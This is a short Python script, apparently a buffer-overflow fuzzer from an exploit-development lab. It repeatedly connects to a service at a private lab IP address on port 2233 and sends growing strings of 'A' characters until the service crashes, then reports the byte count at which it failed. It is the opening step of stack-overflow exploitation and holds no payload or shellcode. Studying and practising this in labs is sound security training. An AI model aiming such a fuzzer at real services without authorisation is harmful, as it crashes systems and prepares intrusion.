#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.22.129"

port = 2233
timeout = 5
prefix = ""

string = prefix + "A" * 2000

while True:
  try:
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except socket.error as e:
    print(e)
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
